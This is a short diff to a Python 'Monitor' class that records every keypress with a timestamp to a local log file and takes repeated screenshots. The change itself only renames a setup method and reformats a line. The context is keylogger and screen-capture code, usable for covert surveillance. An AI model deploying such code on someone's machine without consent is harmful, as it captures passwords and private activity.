@@ -15,12 +15,10 @@ class Monitor:
         with open('./logs/keylogs/logs.txt', 'a') as f:
             f.write('{}\t\t{}\n'.format(k, time.time()))
 
-    def _check_log(self):
+    def _build_logs(self):
         if not os.path.exists('./logs'):
-            os.mkdir("./logs")
-            os.mkdir("./screenshots")
-            os.mkdir("./keylogs")
-
+            os.makedirs("logs/keylogs/")
+            os.makedirs("logs/screenshots/")
 
     def _keylogger(self):
         with Listener(on_press= self._on_press) as listener:
@@ -28,7 +26,8 @@ class Monitor:
 
     def _screenshot(self):
         sct = mss()
-        sct.shot(output='./logs/screenshots/{}.png'.format(time.time()))
+        sct.shot(output='./logs/screenshots/{}.png'
+                 .format(time.time()))
 
     def run(self, interval = 1):
 
